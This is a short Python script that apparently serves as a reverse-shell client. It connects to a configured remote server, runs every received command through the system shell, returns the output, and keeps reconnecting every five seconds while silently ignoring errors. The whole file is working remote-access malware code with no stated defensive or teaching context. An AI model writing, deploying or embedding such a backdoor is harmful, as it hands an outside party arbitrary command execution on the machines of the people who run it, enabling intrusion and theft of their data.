import socket
import subprocess
import selectors
import json
import time
from conf import SERVER_IP, SERVER_PORT

def decode_subprocess_output(output):
  return json.dumps({
    "stdout": output.stdout.decode(),
    "stderr": output.stderr.decode()
  }).encode()

def get_command(socket):
  return json.loads(socket.recv(1024))["command"]

def communication_loop(s):
  while True:
    # get response, which is a command that sho=uld be executed in shell
    command = get_command(s)
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # send back output to server
    s.send(decode_subprocess_output(result))

def connection_loop():
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((SERVER_IP, SERVER_PORT))
      communication_loop(s)
    except:
      if s:
        try:
          s.close()
        except:
          pass
      time.sleep(5)

if __name__ == "__main__":
  connection_loop()
